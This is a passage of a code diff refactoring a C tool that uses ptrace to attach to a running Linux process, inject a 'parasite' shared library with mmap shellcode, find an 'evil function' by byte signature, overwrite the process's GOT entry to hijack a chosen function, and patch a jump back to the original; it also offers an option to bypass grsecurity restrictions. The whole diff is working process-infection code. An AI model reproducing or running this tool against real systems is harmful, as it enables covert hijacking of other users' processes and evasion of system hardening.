+	snprintf(maps, MAXBUF, "/proc/%d/maps", pid);
+
+	fd = fopen(maps, "r");
+	if (!fd) {
+		ERROR("Could not open maps file");
+		return 0;
+	}
+
+	while (fgets(buf, MAXBUF, fd)) {
+		if (strstr(buf, libname)) {
+			char * ptr = strtok(buf, " ");
+			for (int i = 0; i < 4; i++)
+				ptr = strtok(NULL, " ");
+			fclose(fd);
+			return atoi(ptr);
+		}
+	}
+			
+	fclose(fd);
+	return 0;
+}
+
+
+static ulong_t
+search_evil_lib (int pid, char * libname, ulong_t vaddr)
+{
+    uchar_t * buf;
+    int i = 0;
+	size_t libsz;
+    ulong_t evilvaddr = 0;
+	ulong_t ret = 0;
+
+	libsz = get_evil_lib_size(pid, libname);
+	
+    if ((buf = malloc(libsz)) == NULL) {
+        ERROR("Could not allocate lib buffer");
+        exit(EXIT_FAILURE);
     }
 
-    memrw((unsigned long *)buf, vaddr, LIBSIZE, pid, 0);
-    printf("Searching at library base [0x%lx] for evil function\n", vaddr);
+	ptrace_cpy_from((ulong_t*)buf, vaddr, libsz, pid);
+    DEBUG("Searching at library base [0x%lx] for evil function", vaddr);
     
-    for (i = 0; i < LIBSIZE; i++) {
-          if (buf[i] == evilsig[0] && buf[i+1] == evilsig[1] && buf[i+2] == evilsig[2] 
-         && buf[i+3] == evilsig[3] && buf[i+4] == evilsig[4] && buf[i+5] == evilsig[5]
-         && buf[i+6] == evilsig[6] && buf[i+7] == evilsig[7])
-         {
-            evilvaddr = (vaddr + i);
-            break;
-         }
+	// TODO: hierarchical search better
+    for (i = 0; i < libsz; i++) {
+		if (memcmp(&buf[i], evilsig, strlen(evilsig)) == 0) {
+			evilvaddr = (vaddr + i);
+			break;
+		}
     }
+
+	if (!evilvaddr) {
+		ERROR("Could not find evil function");
+		goto out_err;
+	}
     
-    c = 0;
-    j = evilvaddr;
-    printf("Parasite code ->\n");
+    DEBUG("Parasite code ->");
+#ifdef DEBUG_ENABLE
+	dump_buf(buf, 50);
+#endif
 
-    while (j++ < evilvaddr + 50)
-    {
-        if ((c++ % 20) == 0)
-            printf("\n");
-        printf("%.2x ", buf[i++]);
-    }
-    printf("\n");
-
+out_err:
     free(buf);
-    if (evilvaddr)
-        return (evilvaddr);
-    return 0;
+	return evilvaddr;
 }
 
-static int 
-check_for_lib (char *lib, FILE *fd)
+
+static bool 
+evil_lib_present (char * lib, int pid)
 {
+	char meminfo[MAXBUF];
     char buf[MAXBUF];
+	FILE * fd;
+
+	memset(meminfo, 0, sizeof(meminfo));
+	snprintf(meminfo, sizeof(meminfo), "/proc/%d/maps", pid);
+
+	fd = fopen(meminfo, "r");
+
+	if (!fd) {
+		ERROR("Could not open map file");
+		return true;
+	}
     
-    while(fgets(buf, MAXBUF-1, fd))
-	    if (strstr(buf, lib))
-		    return 1;
-    return 0;
+    while (fgets(buf, MAXBUF, fd)) {
+		if (strstr(buf, lib)) {
+			fclose(fd);
+			return true;
+		}
+	}
+
+	fclose(fd);
+    return false;
 }
 
-#define MEMINFO_MAX_SIZE 20
+
+static Elf32_Addr
+patch_got (struct opts * opt, struct sym_info * sinfo, ulong_t lib_base, ulong_t patch_val)
+{
+	Elf32_Addr ret = 0;
+	Elf32_Addr got_offset;
+	
+	// overwrite GOT entry with addr of evilfunc (our replacement)
+	for (int i = 0; i < sinfo->count; i++) {
+		if (strcmp(sinfo->syms[i].name, opt->func) == 0) {
+
+			DEBUG("Found string <%s> to patch", sinfo->syms[i].name);
+
+			if (opt->et_dyn) {
+				got_offset = (lib_base + (sinfo->syms[i].offset - text_base));
+			} else {
+				got_offset = sinfo->syms[i].offset;
+			}
+
+			original = (ulong_t)ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
+			ptrace(PTRACE_POKETEXT, opt->pid, got_offset, patch_val);
+			ret = ptrace(PTRACE_PEEKTEXT, opt->pid, got_offset);
+			break;
+		}
+	}
+	return ret;
+}
+
 
 static void
 usage (char ** argv)
 {
-	fprintf(stderr, "Usage: %s <pid> <function> [opts]\n"
-			"-d  ET_DYN processes\n"
-			"-g  bypass grsec binary flag restriction \n"
-			"-2  Meant to be used as a secondary method of\n"
-			"finding sysenter with -g; if -g fails, then add -2\n"
-			"Example 1: %s <pid> <function> -g\n"
-			"Example 2: %s <pid> <function> -g -2\n", argv[0],argv[0],argv[0]);
+	printf("\nUsage: %s -p <pid> -f <function> [opts]\n"
+			"\t-p  (required) PID of target process\n"
+			"\t-f  (required) Function name we're hijacking\n"
+			"\t-l  (required) Parasite library's name\n"
+			"\t-d  ET_DYN processes\n"
+			"\t-g  bypass grsec binary flag restriction \n"
+			"\t-s  Meant to be used as a secondary method of\n"
+			"\t    finding sysenter with -g; if -g fails, then add -s\n\n"
+			"Example 1: %s -p <pid> -f <function> -l <lib> -g\n"
+			"Example 2: %s -p <pid> -f <function> -l <lib> -g -s\n\n", argv[0], argv[0], argv[0]);
 
 	exit(EXIT_SUCCESS);
 }
 
 
-static bool
-is_valid_elf (unsigned char * mem, bool et_dyn)
+
+static void 
+parse_args (int argc, char ** argv, struct opts * opt)
 {
-	Elf32_Ehdr * ehdr = (Elf32_Ehdr*)mem;
+	int c;
+	opterr = 0;
 
-	if (strncmp((const char*)ehdr->e_ident, "\x7F" "ELF", 4))
-		return false;
+	opt->grsec    = false;
+	opt->sysenter = false;
+	opt->et_dyn   = false;
+	opt->pid      = -1;
+	opt->libname  = NULL;
+	opt->func     = NULL;
+	
+	while ((c = getopt(argc, argv, "dgsp:f:l:")) != -1) {
+		switch (c) {
+			case 'd':
+				opt->et_dyn = true;
+				break;
+			case 'g':
+				opt->grsec = true;
+				break;
+			case 's':
+				opt->sysenter = true;
+				break;
+			case 'p':
+				opt->pid = (int)atol(optarg);
+				break;
+			case 'f':
+				opt->func = optarg;
+				break;
+			case 'l':
+				opt->libname = optarg;
+				break;
+			case '?':
+				if (isprint(optopt))
+					ERROR("Unknown option '-%c'", optopt);
+				else 
+					ERROR("Unknown option character '\\x%x", optopt);
+				exit(EXIT_FAILURE);
+			default:
+				abort();
+		}
+	}
 
-	/* 
-	 * we currently target executables only, 
-     * although ET_DYN would be a viable target 
-	 * as well.
- 	 */
-	if (ehdr->e_type != ET_EXEC && ehdr->e_type != ET_DYN)
-		return false;
+	if (opt->pid == -1) {
+		printf("-p option is required\n");
+		usage(argv);
+	}
 
-	// Target process is of type ET_DYN, but the '-d' option was not specified
-	if (ehdr->e_type == ET_DYN && !et_dyn) 
+	if (opt->func == NULL) {
+		printf("-f option is required\n");
+		usage(argv);
+	}
+
+	if (opt->libname == NULL) {
+		printf("-l option is required\n");
+		usage(argv);
+	}
+}
+
+
+static char * 
+map_binary (int pid)
+{
+	char meminfo[MAXBUF] = {0};
+	struct stat st;
+	int fd;
+	char * ret = NULL;
+
+	snprintf(meminfo, sizeof(meminfo), "/proc/%d/exe", pid);
+
+	if ((fd = open(meminfo, O_RDONLY)) == -1) {
+		ERROR("Could not open binary");
+		return MAP_FAILED;
+	}
+
+	if (fstat(fd, &st) < 0) {
+		ERROR("Could not stat binary");
+		return MAP_FAILED;
+	}
+
+	ret = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
+
+	close(fd);
+
+	return ret;
+}
+
+
+static inline bool 
+binary_is_pie (struct opts * opt)
+{
+	return opt->et_dyn;
+}
+
+
+static bool
+good_elf (Elf32_Ehdr * ehdr, struct opts * opt)
+{
+	if (!(ehdr->e_ident[EI_MAG0] == ELFMAG0 &&
+ 		  ehdr->e_ident[EI_MAG1] == ELFMAG1 &&
+		  ehdr->e_ident[EI_MAG2] == ELFMAG2 &&
+		  ehdr->e_ident[EI_MAG3] == ELFMAG3)) {
+		ERROR("Binary is not an ELF executable");
 		return false;
+	}
+
+	if (ehdr->e_ident[EI_CLASS] != ELFCLASS32) {
+		ERROR("Only 32-bit ELF executables are supported");
+		return false;
+	}
+
+
+	if (!(ehdr->e_type == ET_EXEC || ehdr->e_type == ET_DYN)) {
+		ERROR("Only executable binaries are supported");
+		return false;
+	}
+	
+	if (ehdr->e_type == ET_DYN && !opt->et_dyn) {
+		ERROR("Target process is of type ET_DYN, but the '-d' option was not specified");
+		return false;
+	}
 
 	return true;
 }
 
 
-// TODO: getopt
+static void
+parse_headers (Elf32_Ehdr * ehdr, struct segments * segs)
+{
+	Elf32_Phdr * phdr = (Elf32_Phdr*)((char*)ehdr + ehdr->e_phoff);
+	int i;
+
+	for (i = 0; i < ehdr->e_phnum; i++, phdr++) {
+		if (phdr->p_type == PT_LOAD) { 
+			// .text
+			if (phdr->p_flags == (PF_X | PF_R)) {
+				segs->segs[TYPE_TEXT].base   = phdr->p_vaddr;
+				text_base = phdr->p_vaddr;
+				segs->segs[TYPE_TEXT].offset = phdr->p_offset;
+				segs->segs[TYPE_TEXT].len    = phdr->p_filesz;
+			}
+
+			// .data
+			if (phdr->p_flags == (PF_W | PF_R)) {
+				segs->segs[TYPE_DATA].base   = phdr->p_vaddr;
+				data_base = phdr->p_vaddr;
+				segs->segs[TYPE_DATA].offset = phdr->p_offset;
+				segs->segs[TYPE_DATA].len    = phdr->p_filesz;
+			}
+		}
+	}
+}
+
+
+static int
+inject_lib (struct opts * opt, ulong_t * evilbase, struct segments * segs)
+{
+	int status;
+
+	DEBUG("Injecting evil lib");
+	
+	if (opt->grsec)
+		grsec_mmap_library(opt->pid, opt->libname, opt->sysenter, evilbase, segs);
+	else
+		mmap_library(opt->pid, evilbase);
+
+	if (ptrace(PTRACE_ATTACH, opt->pid, NULL, NULL)) {
+		ERROR("Could not attach");
+		return -1;
+	}
+
+	waitpid(opt->pid, &status, WUNTRACED);
+
+	return 0;
+}
+
+
+static inline void
+attach (int pid)
+{
+	int status;
+
+	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL)) {
+		ERROR("Failed to attach to process");
+		exit(EXIT_FAILURE);
+	}
+	waitpid(pid, &status, WUNTRACED);
+}
+
+
 int 
 main (int argc, char **argv)
 {
-	char meminfo[MEMINFO_MAX_SIZE], buf[MAXBUF], tmp[MAXBUF], *p, *file;
-	char *function, grsec = 0;
-	bool et_dyn = false;
-	FILE *fd;
-	uint32_t i;
-	struct stat st;
-	unsigned char *mem;
+	char ps[7], *p;
+	uchar_t * mem = NULL;
 	Elf32_Ehdr *ehdr;
-	Elf32_Phdr *phdr;
-	Elf32_Addr got_offset, export, elf_base, dyn_mmap_got_addr;
-	unsigned long evilfunc;
-	struct linking_info *lp;
-	int pid, md, status;
+	Elf32_Addr ret;
+	ulong_t evilfunc;
+	ulong_t evilbase;
+	struct sym_info * sinfo;
 
-	if (argc < 3) 
-		usage(argv);
+	struct opts opt;
+	struct segments segs;
 
-	i = 0;
+	unsigned char evil_code[MAXBUF];
+	unsigned char initial_bytes[12];
+	ulong_t injection_vaddr = 0;
 
-	while (argv[1][i] >= '0' && argv[1][i] <= '9')
-		i++;
+	parse_args(argc, argv, &opt);
 
-	if (i != strlen(argv[1]))
-		usage(argv);
-
-	if (argc > 3) {
-		if (argv[3][0] == '-' && argv[3][1] == 'd')
-			et_dyn = true;
-
-		if (argv[3][0] == '-' && argv[3][1] == 'g')
-			grsec = 1;
-		if (argv[4] && !strcmp(argv[4], "-2"))
-			static_sysenter = 1;
-		else
-			if (argv[4])
-			{
-				printf("Unrecognized option: %s\n", argv[4]);
-				usage(argv);
-			}
-
-	}
-
-	pid = atoi(argv[1]);
-	if((function = strdup(argv[2])) == NULL) {
-		perror("strdup");
-		exit(-1);
-	}
-
-	snprintf(meminfo, sizeof(meminfo), "/proc/%d/maps", pid);
-
-	if ((fd = fopen(meminfo, "r")) == NULL) {
-		fprintf(stderr, "PID: %i cannot be checked, /proc/%i/maps does not exist\n", pid, pid);
+	mem = map_binary(opt.pid);
+	if (mem == MAP_FAILED) {
+		ERROR("Could not map binary");
 		exit(EXIT_FAILURE);
 	}
 
-	/* ET_DYN */
-	if (et_dyn) {
-		while (fgets(buf, MAXBUF-1, fd)) {   
-			if (strstr(buf, "r-xp") && !strstr(buf, ".so")) {
+	ehdr = (Elf32_Ehdr *)mem;
 
-				strncpy(tmp, buf, MAXBUF-1);
-
-				if ((p = strchr(buf, '-')))
-					*p = '\0';
-
-				text_base = strtoul(buf, NULL, 16);
-
-				if (strchr(tmp, '/'))
-					while (tmp[i++] != '/');
-				else {
-					fclose(fd);
-					printf("error parsing pid map\n");
-					exit(EXIT_FAILURE);
-				}
-				if ((file = strdup((char *)&tmp[i - 1])) == NULL)
-				{
-					perror("strdup");
-					exit(EXIT_FAILURE);
-				}      
-				i = 0;  
-				while (file[i++] != '\n');
-				file[i - 1] = '\0';
-				goto next;
-			}
-		}
+	// make sure this is a valid ELF
+	if (!good_elf(ehdr, &opt)) {
+		ERROR("ELF verification failed");
+		exit(EXIT_FAILURE);
 	}
 
-	/* ET_EXEC */
-	fgets(buf, MAXBUF-1, fd);
-	strncpy(tmp, buf, MAXBUF-1);
+	parse_headers(ehdr, &segs);
 
-	if (strchr(tmp, '/'))
-		while (tmp[i++] != '/');
-	else
-	{
-		fclose(fd);
-		printf("error parsing pid map\n");
-		exit(-1);
-	}
-	if ((file = strdup((char *)&tmp[i - 1])) == NULL)
-	{
-		perror("strdup");
-		exit(-1);
-	}
+	// attach to the running process
+	attach(opt.pid);
 
-	i = 0;
-	while (file[i++] != '\n');
-	file[i - 1] = '\0';
-
-next: 
-
-	if ((md = open(file, O_RDONLY)) == -1)
-	{
-		perror("open");
-		exit(-1);
-	}
-
-	if (fstat(md, &st) < 0)
-	{
-		perror("fstat");
-		exit(-1);
-	}
-
-	mem = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, md, 0);
-	if (mem == MAP_FAILED)
-	{
-		perror("mmap");
-		exit(-1);
-	}
-
-	ehdr = (Elf32_Ehdr*)mem;
-
-
-	if (!is_valid_elf(mem, et_dyn))
-		ERR_EXIT_FAIL("%s is not a valid ELF file", file);
-
-	phdr = (Elf32_Phdr *)(mem + ehdr->e_phoff);
-
-	/* get the base -- p_vaddr of text segment */
-	for (i = ehdr->e_phoff; i-- > 0; phdr++)
-	{
-		if (phdr->p_type == PT_LOAD && !phdr->p_offset)
-		{
-			elf_base = text_base = phdr->p_vaddr;
-			segment.text_off = phdr->p_offset;
-			segment.text_len = phdr->p_filesz;
-			phdr++;
-			segment.data_off = phdr->p_offset;
-			segment.data_len = phdr->p_filesz;
-			data_segment = phdr->p_vaddr;
-			break;
-		}
-	}
-
-	if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
-		ERR_EXIT_FAIL("Could not attach to process");
-
-	waitpid(pid, &status, WUNTRACED);
-
-	/* get the symbol relocation information */
-	if ((lp = (struct linking_info *)get_plt(mem)) == NULL) {
-		printf("get_plt() failed\n");
-		goto done;
+	// get symbol relocation information for our target
+	sinfo = get_plt(mem);
+	
+	if (!sinfo) {
+		ERROR("Could not parse PLT information");
+		exit(EXIT_FAILURE);
 	}
 
 	/* inject mmap shellcode into process to load lib */
-	if (check_for_lib(EVILLIB, fd) != 1) {
-		printf("Injecting library\n");
-		if (grsec)
-			grsec_mmap_library(pid);
-		else
-			mmap_library(pid);
-		if (ptrace(PTRACE_ATTACH, pid, NULL, NULL))
-		{
-			perror("ptrace_attach");
-			exit(-1);
-		}
-		waitpid(pid, &status, WUNTRACED);
-		fclose(fd);
-
-		if ((fd = fopen(meminfo, "r")) == NULL)
-		{
-			printf("PID: %i cannot be checked, /proc/%i/maps does not exist\n", pid, pid);
-			return -1;
-		}
-	}
-	else
-	{
-		printf("Process %d appears to be infected, %s is mmap'd already\n", pid, EVILLIB);
-		goto done;
+	if (evil_lib_present(opt.libname, opt.pid)) {
+		ERROR("Process %d already infected, %s is mmap'd already", opt.pid, opt.libname);
+		goto out_err;
+	} else {
+		inject_lib(&opt, &evilbase, &segs);
 	}
 
-	if ((evilfunc = search_evil_lib(pid, evil_base)) == 0) {
-		printf("Could not locate evil function\n");
-		goto done;
+	if ((evilfunc = search_evil_lib(opt.pid, opt.libname, evilbase)) == 0) {
+		ERROR("Could not locate evil function");
+		goto out_err;
 	}
 
+	DEBUG("Evil function location: 0x%lx", evilfunc);
+	DEBUG("Modifying GOT entry to replace <%s> with 0x%lx", opt.func, evilfunc);
 
-	printf("Evil Function location: %lx\n", evilfunc);
-	printf("Modifying GOT entry: replace <%s> with %lx\n", function, evilfunc);
+	ret = patch_got(&opt, sinfo, evilbase, evilfunc);
 
-	/* overwrite GOT entry with addr to evilfunc (our replacement) */
+	if (ret == evilfunc)
+		DEBUG("Successfully modified GOT entry");
+	else {
+		ERROR("Failed to modify GOT entry");
+		goto out_err;
+	} 
 
+	DEBUG("New GOT value: %x", ret);
 
-	for (i = 0; i < lp[0].count; i++)
-	{
-		if (strcmp(lp[i].name, function) == 0)
-		{
-			if (et_dyn)
-				dyn_mmap_got_addr = (evil_base + (lp[i].offset - elf_base));
-
-			got_offset = (!et_dyn) ? lp[i].offset : dyn_mmap_got_addr;
-
-			export = memrw(NULL, got_offset, 1, pid, evilfunc);
-			if (export == evilfunc)
-				printf("Successfully modified GOT entry\n\n");
-			else
-			{
-				printf("Failed at modifying GOT entry\n");
-				goto done;
-			} 
-			printf("New GOT value: %x\n", export);
-
-		}
-	}
-
-	unsigned char evil_code[256];
-	unsigned char initial_bytes[12];
-	unsigned long injection_vaddr = 0;
-
-	/* get a copy of our replacement function and search for transfer sequence */ 
-	memrw((unsigned long *)evil_code, evilfunc, 256, pid, 0);
+	// get a copy of our replacement function 
+	// and search for control transfer sequence 
+	ptrace_cpy_from((ulong_t*)evil_code, evilfunc, MAXBUF, opt.pid);
 
 	/* once located, patch it with the addr of the original function */
-	for (i = 0; i < 256; i++)
-	{
-		printf("%.2x ", evil_code[i]);
-		if (evil_code[i] == tc[0] && evil_code[i+5] == tc[1] && evil_code[i+6] == tc[2] && evil_code[i+7] == tc[3])
-		{
-			printf("\nLocated transfer code; patching it with %lx\n", original);
+	for (int i = 0; i < MAXBUF; i++) {
+		if (memcmp(&evil_code[i], tc, strlen(tc)) == 0) {
+			DEBUG("Located transfer code. Patching with %lx", original);
 			injection_vaddr = (evilfunc + i) + 3;
 			break;
 		}
 	}
 
-	if (!injection_vaddr)
-	{
-		printf("Could not locate transfer code within parasite\n");
-		goto done;
+	if (!injection_vaddr) {
+		ERROR("Could not locate transfer code within parasite");
+		goto out_err;
 	}
 
-	/* patch jmp code with addr to original function */
-	memrw((unsigned long *)initial_bytes, injection_vaddr, INJECT_TRANSFER_CODE, pid, original);
-
-	printf("Confirm transfer code: ");
-	for (i = 0; i < 7; i++)
-		printf("\\x%.2x", initial_bytes[i]);
-	puts("\n");
+	// patch jmp code with addr to original function
+	inject_transfer_code(opt.pid, injection_vaddr, original);
 
 done:
-	munmap(mem, st.st_size);
-	if (ptrace(PTRACE_DETACH, pid, NULL, NULL) == -1)
-		perror("ptrace_detach");
-
-	close(md);
-	fclose(fd);
-	exit(EXIT_SUCCESS);
-
+	ptrace(PTRACE_DETACH, opt.pid, NULL, NULL);
 	return 0;
+
+out_err:
+	ptrace(PTRACE_DETACH, opt.pid, NULL, NULL);
+	return EXIT_FAILURE;
 }
